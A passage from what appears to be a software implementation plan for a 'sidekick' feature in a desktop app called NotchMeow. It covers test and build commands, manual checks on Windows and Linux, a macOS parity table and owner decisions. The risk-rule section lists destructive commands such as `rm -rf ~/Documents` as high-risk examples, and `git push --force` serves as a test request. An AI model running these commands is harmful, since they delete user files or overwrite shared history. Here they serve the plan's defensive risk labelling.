edit("ARCHITECT.md", r'''   - **Sub-project I (the wardrobe):**''', r'''   - **Sub-project F1 on Windows/Linux (the sidekick):** the rules are `shared/sidekick-core.js`, copied into `windows/src/sidekick/core.generated.ts` by `scripts/gen-sidekick-ts.mjs`. `island/hooks.ts` feeds the memory-only ledger (`sidekick/ledger.ts`) before the one-card gate; `Sidekick` (`sidekick/controller.ts`, installed through `sidekick/hub.ts`) asks the rules for a recap on return (`presence.ts` from the platform's lock, sleep and display news and a lazy idle reading), for nudges (`stuckclock.ts`: one one-shot timer) and for the permission line (`explain.ts`), and offers every note to the gate (`notes.ts`) which opens the island through its existing peek on a new `sidekick` view. The chat answers "What's Claude doing?" itself (`statuschat.ts`); a drop on an agent's cat copies the path (Rust `copy_text`); a local model may reword a note (`voice.ts`, Rust `ai_oneshot`).
   - **Sub-project I (the wardrobe):**''')
PY
```

- [ ] **Step 2: Run every check**

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ tests 372`, `ℹ pass 372`, `ℹ fail 0`.

```bash
( cd windows && npm run check:ai 2>&1 | tail -1; npm run check:claude 2>&1 | tail -1 )
```

Expected: `All AI UI checks passed`, `All Claude Code UI checks passed`.

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 101`, `ℹ pass 101`.

```bash
bash scripts/test-sidekick-contract.sh 2>&1 | grep -E '^# (tests|pass|fail)|✓ 10 fixture files|✓ two generator'
```

Expected: `✓ 10 fixture files match sidekick-core.js`, `✓ two generator runs write identical bytes`.

```bash
node scripts/gen-sidekick-ts.mjs --check && node scripts/check-fixtures-additive.mjs a5d9066 2>&1 | tail -2
```

Expected: `matches shared/sidekick-core.js`, `fixtures changed only by addition since a5d9066`.

```bash
bash scripts/check-site.sh 2>&1 | tail -3
```

Expected: `docs/assets/cats.js and cats.css are what a fresh build makes`.

```bash
( cd windows && npx --no-install vite build --outDir ../.claude/checkpoints/f1-tauri/dist --emptyOutDir 2>&1 | tail -2; grep -rl 'dev-wait' ../.claude/checkpoints/f1-tauri/dist || echo 'none of the dev runs is in the bundle' )
```

Expected: `built in`, `none of the dev runs is in the bundle`.

The release bundle builds, and holds none of the dev runs (`dev-wait` is a word of `dev.ts`). **This is the one place `vite build` runs, into the gitignored checkpoint folder** (never `npm run build`: its `prebuild` runs cargo).

```bash
windows/scripts/cargo-linux.sh test --workspace --target-dir /repo/windows/target/f1-tauri
```

Expected: `test result: ok`.

Expected from the last step on the Linux image: every test of the workspace passes, including `sidekick_settings`, `sidekick_presence`, `oneshot`, the two `settings` tests and the relay's. The Windows `cargo check` and a release build are **owed to CI** (`windows-tests.yml`); say so in the report.

- [ ] **Step 3: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/README.md CLAUDE.md ARCHITECT.md
git commit -F - <<'MSG'
feat(sidekick): the docs and the final checks

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

---

## Checkpoint 3: the owner's real-build checks, then sign-off

Everything above runs without launching the app. **What no test program and no headless browser can show** is checked by the owner on a real build (`npm run tauri dev` on each system; the session never starts it). The session sends this list and waits.

**Windows** (the owner's PC):
1. **A recap.** Let Claude Code run something in VS Code, lock the PC (Win+L) for three minutes, unlock: the island opens on **"Welcome back"** with the right counts and files; one recap, not two; **OK** folds it. Lock for 30 seconds and unlock: **no** recap. Sit idle for six minutes with an agent working, then move the mouse: the recap comes at the next hook event or when the island opens (it can wait for one: README says so).
2. **A high-risk request.** Ask Claude Code to run `git push --force`: the card shows the grey line, the orange **High risk** capsule and the cat looks surprised once; **Deny** and **Allow** work as they did; a medium request (`npm install …`) has a line and no capsule; a long command (over 2000 characters) is never labelled safe.
3. **A deliberate loop.** Make Claude run the same failing command four times: one nudge, once; **Not now** twice mutes loops; **Settings → Sidekick → Unmute** brings them back.
4. **A long wait.** Leave an approval unanswered for a minute with the island showing another pill: the waiting nudge; at 110 s its words change in place.
5. **The status question on a cloud chat.** With a cloud key chosen, type `What's Claude doing?`: a card from NotchMeow with no reply from the model; the provider's dashboard shows no request for it. A longer question that contains the words goes to the model as usual.
6. **A file dropped on an agent's cat.** In A cat for each agent mode with Gemini CLI or Antigravity running, drag a file from Explorer over the island: the strip of chips shows; drop on a chip: **"Copied the path — paste it into …"**, the path on the clipboard (paste it somewhere), VS Code forward on the agent's folder, no key sent anywhere. Drop on the big cat or elsewhere on the island: the chat/Ask drop as it always was. Drop several files: one path per line.
7. **The local voice.** With Ollama or LM Studio running, a recap's sentence is replaced by a nicer one once; with the switch off or no model, never; Settings shows **"Found: {model}"** or **"No local model found"**. A model on another computer is never asked.
8. **Unmute** in Settings → Sidekick. **The cost:** with the island hidden and nothing running, Task Manager shows 0 % for NotchMeow.

**Linux** (GNOME and one wlroots or KDE desktop, X11 and Wayland where possible):
9. The same recap after locking, after suspending and after a switch to another user (the `wake` word), the card's line and badge, the nudges and the status card.
10. **Idle** where GNOME's idle monitor exists: `gdbus call --session --dest org.gnome.Mutter.IdleMonitor --object-path /org/gnome/Mutter/IdleMonitor/Core --method org.gnome.Mutter.IdleMonitor.GetIdletime` prints `(uint64 …,)`, and five idle minutes count as away; on KDE or wlroots only a lock or a suspend does.
11. **The clipboard.** Drop on a chip: the path is on the clipboard on X11 and on Wayland (a compositor may refuse a program that has no focus: the line then says **"Couldn't copy the path."**); nothing is opened.
12. **A user switch.** Switch to another user (Win+L is not enough: use the user menu) and back after three minutes with an agent working: a recap comes; on Linux switch to another virtual terminal session and back.

Then the owner signs off, and the session dispatches `nm-reviewer-deep` over the whole branch (`git diff notchmeow/rebrand...HEAD`), **with the privacy review in its brief**: that no prompt, assistant text, transcript, command, full path or file content reaches the ledger, a line, a log, a saved setting, the cloud, or a request to the local model; that the sidekick never answers an approval; that the relay carries less than before; that nothing polls.

---

## Parity with macOS

What the Mac gets that this app does not, and the reverse. **The Mac gets at least what this gets.**

| | Mac (F1-mac) | Windows and Linux (this plan) |
|---|---|---|
| The rules | Swift ports of the contract | A generated copy of the contract, replayed against the same fixtures |
| Agents | Claude Code, Codex (GitHub build), Gemini CLI, Antigravity | Claude Code, Gemini CLI, Antigravity (no Codex hooks) |
| Permission line and badge | Claude Code and Codex | Claude Code only |
| Failure reason text | The Mac relay forwards the whole payload (up to 1 MiB) | None: the relay drops the error text, so "hit 3 errors in a row" is all it can say |
| Away signals | Lock, sleep, screen off from `PresenceMonitor` (shared with the desktop cat); idle on the hidden island's 10 Hz tick, at most every 5 s | Lock and display (Windows) or lock and sleep (Linux) from the existing watchers; idle read lazily (a hook event, the island opening, an unlock); Linux idle only on GNOME |
| Drop on an agent's cat | The grid's cats in A cat for each agent mode, cat 2 in Two cats; terminal or editor forward by the existing routes | **Chips for each running agent on the drop view** (the grid is gone while a file is over the island), in every display mode; VS Code forward on Windows, nothing opened on Linux |
| Local wording | A local server or Apple on-device | A local server only |
| Claude Code seen | Every terminal (the all-terminals round is merged) | Every terminal |

## The owner's answers (2026-10-14)

The plan is written to these answers.

1. **Drop on an agent on Windows and Linux: agent chips on the drop view.** While a file is dragged over the island, small chips for each running agent (Claude Code, Gemini CLI, Antigravity, any other tagged agent) appear on the drop view. A drop on a chip copies the original path and brings that agent's app forward (Windows: the project folder in VS Code by the existing "Open terminal" action; Linux: nothing is opened, the path is copied only), with the honest line. The big drop area (Ask, and G1's future Ask and Shelf halves) stays as it is: the chips are an additive strip that does not move the shipping drop view.
2. **The TypeScript port is a generated copy of `shared/sidekick-core.js`** (`scripts/gen-sidekick-ts.mjs`, with a `--check` that `npm run check:sidekick` and CI run), not a hand-made port: no drift is possible, and every fixture is replayed against the copy.
3. **The clipboard** uses features of the existing `windows` crate (`Win32_System_DataExchange`, `Win32_System_Memory`; no new crate, `Cargo.lock` unchanged) on Windows, and the GTK clipboard on Linux.
4. **The relay also drops `last_assistant_message` and `prompt_response`** (the spec keeps no agent text).
5. **A nudge that fell due while the user was away is dropped, not saved.**
6. **A nudge counts as given only once it was shown** (one that waited and ran out of its 30 s was never given).
7. **A recap past three rows is cut with "…"** (the contract's "+N more" row is shown as that).
8. **The chat's "What's Claude doing?" chip is shown only while an agent is live.**
9. **A lock and a user switch are away** (Windows: the session disconnecting from the console or a remote session; Linux: logind's `Active` going false, beside `LockedHint`).

Still the plan's own choices, which the owner can overrule: idle on Linux through `gdbus` (GNOME only, no new crate); "the island is open on something else" counts as "typing" for the gate; the Linux `Active` reading shares the desktop cat's "locked" cause, so an unlock while the session is inactive clears it (checked in the real-build list).

## Self-review notes (for the controller)

The spec's sections and where this plan covers them: Coverage → the Review Focus and Parity tables; The ledger → Tasks 1 and 4; Risk rules → Tasks 1 and 8; Stuck rules and the clock → Task 7; Away and recap → Tasks 5 and 6; The permission line → Task 8; What's Claude doing? → Task 9; Drop on an agent's cat → Tasks 10 and 11; Dismissal memory → Tasks 2 and 6; The show gate → Task 6; The local voice → Task 12; Settings and Storage → Task 2; Contract and Testing → Tasks 1 and 13; Rounds → this plan is F1-tauri. **Not in this plan, as the spec says:** the E3 chat cards' line and badge, F2, F3, sound for the notes, a new emote.

## Contract change to port (from F1-mac, 2026-10-14)

F1-mac changed the shared contract in commit `260e3eb` ("stuckStep skips muted kinds", additive; it reaches `notchmeow/rebrand` when F1-mac merges). Before Task 1, rebase on a `notchmeow/rebrand` that contains it, and port it:
- `StuckContext` (the TS interface near this plan's line 542) gains `muted?: string[]`: the nudge kinds the user muted. A muted kind is skipped when the nudge is chosen (the next-ranked unmuted kind that is due fires), and a muted waiting or quiet deadline is left out of `nextAt`. A non-array, unknown names, duplicates and `recap` are ignored; a missing or empty list is the old behaviour.
- The controller's `stuckStep` calls (near lines 3901, 3927 and 3931) pass the stored settings' muted kinds.
- `tests/fixtures/sidekick/stuck-cases.json` gains 10 `muted: …` timelines and a top-level `ctxNote`; the replay already passes each probe's `ctx` and must ignore `ctxNote`.
- `rm -rf ./build` is medium (`rm_in_project`), `rm -rf ~/Documents` and `rm -rf build*` are high, as in the contract.
